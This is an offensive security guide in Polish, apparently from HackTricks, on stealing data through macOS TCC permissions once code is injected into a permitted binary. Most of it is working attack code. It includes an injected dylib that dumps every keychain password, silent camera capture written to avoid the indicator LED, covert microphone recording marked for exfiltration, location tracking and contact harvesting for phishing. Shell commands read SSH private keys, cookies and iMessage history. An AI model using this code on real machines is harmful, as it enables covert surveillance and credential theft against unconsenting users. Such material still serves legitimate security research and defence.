# macOS Kradzież poświadczeń i danych przez uprawnienia TCC

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

macOS TCC (Transparency, Consent, and Control) chroni dostęp do wrażliwych danych użytkownika. Gdy atakujący **przejmuje binarkę, która już ma przyznane uprawnienia TCC**, odziedzicza te uprawnienia. Ta strona dokumentuje możliwości eksploatacji każdego uprawnienia TCC związanego z kradzieżą danych.

> [!WARNING]
> Wstrzyknięcie kodu do binarki z przyznanymi uprawnieniami TCC (poprzez DYLD injection, dylib hijacking lub task port) **cicho dziedziczy wszystkie jej uprawnienia TCC**. Nie ma dodatkowego monitu ani weryfikacji, gdy ten sam proces odczytuje chronione dane.

---

## Keychain Access Groups

### Nagroda

macOS Keychain przechowuje:
- **Hasła Wi‑Fi** — wszystkie zapisane dane uwierzytelniające sieci bezprzewodowych
- **Hasła do stron internetowych** — Safari, Chrome (gdy używa Keychain) i hasła innych przeglądarek
- **Hasła aplikacji** — konta e-mail, poświadczenia VPN, tokeny developerskie
- **Certyfikaty i klucze prywatne** — podpisywanie kodu, TLS klienta, szyfrowanie S/MIME
- **Bezpieczne notatki** — sekrety przechowywane przez użytkownika

### Entitlement: `keychain-access-groups`

Elementy Keychain są zorganizowane w **grupy dostępu**. Uprawnienie aplikacji `keychain-access-groups` wymienia, do których grup ma dostęp:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Eksploatacja
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Dostęp do kamery (kTCCServiceCamera)

### Wykorzystanie

Plik binarny z przyznanym dostępem do kamery w TCC (przez `kTCCServiceCamera` lub `com.apple.security.device.camera` entitlement) może przechwytywać zdjęcia i wideo:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Począwszy od **macOS Sonoma**, wskaźnik kamery na pasku menu jest trwały i nie można go ukryć programowo. W **starszych wersjach macOS** krótkie nagranie może nie spowodować zauważalnego wskaźnika.
  
---

## Microphone Access (kTCCServiceMicrophone)

### Exploitation

Dostęp do mikrofonu rejestruje wszystkie dźwięki z wbudowanego mikrofonu, zestawu słuchawkowego lub podłączonych urządzeń wejścia audio:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Atak: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Śledzenie lokalizacji (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Ciągłe śledzenie
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakty / Kalendarz / Zdjęcia

### Eksfiltracja danych osobowych

| Usługa TCC | Framework | Dane |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Imiona i nazwiska, adresy e-mail, numery telefonów, adresy |
| `kTCCServiceCalendar` | `EventKit` | Spotkania, uczestnicy, lokalizacje |
| `kTCCServicePhotos` | `Photos.framework` | Zdjęcia, zrzuty ekranu, metadane lokalizacji |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Zbieranie kontaktów
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Dostęp do konta iCloud

### Uprawnienie: `com.apple.private.icloud-account-access`

To uprawnienie umożliwia komunikację z usługą XPC `com.apple.iCloudHelper`, zapewniając dostęp do:
- **iCloud tokens** — tokeny uwierzytelniające dla Apple ID użytkownika
- **iCloud Drive** — zsynchronizowane dokumenty ze wszystkich urządzeń
- **iCloud Keychain** — hasła synchronizowane na wszystkich urządzeniach Apple
- **Find My** — lokalizacja wszystkich urządzeń Apple użytkownika
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Przejęcie binarki z uprawnieniami iCloud rozszerza atak z **pojedynczego urządzenia na cały ekosystem Apple**: inne Macs, iPhones, iPads, Apple Watch. Synchronizacja iCloud Keychain oznacza, że hasła ze wszystkich urządzeń są dostępne.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### The Most Powerful TCC Permission

Full Disk Access przyznaje możliwość odczytu **każdego pliku w systemie**, w tym:
- Dane innych aplikacji (Messages, Mail, Safari history)
- Bazy danych TCC (ujawniające wszystkie inne uprawnienia)
- Klucze SSH i konfiguracja
- Ciasteczka przeglądarki i tokeny sesji
- Bazy danych aplikacji i pamięci podręczne
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Macierz priorytetów eksploatacji

Podczas oceny injectable TCC-granted binaries, priorytetyzuj według wartości danych:

| Priority | TCC Permission | Why |
|---|---|---|
| **Krytyczny** | Full Disk Access | Dostęp do wszystkiego |
| **Krytyczny** | TCC Manager | Może przyznać dowolne uprawnienie |
| **Wysoki** | Keychain Access Groups | Wszystkie przechowywane hasła |
| **Wysoki** | iCloud Account Access | Kompromitacja wielu urządzeń |
| **Wysoki** | Input Monitoring (ListenEvent) | Keylogging |
| **Wysoki** | Accessibility | Kontrola GUI, samoprzyznawanie |
| **Średni** | Screen Capture | Przechwytywanie obrazu |
| **Średni** | Camera + Microphone | Nadzór |
| **Średni** | Contacts + Calendar | Dane do inżynierii społecznej |
| **Niski** | Location | Śledzenie fizyczne |
| **Niski** | Photos | Dane osobiste |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Źródła

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
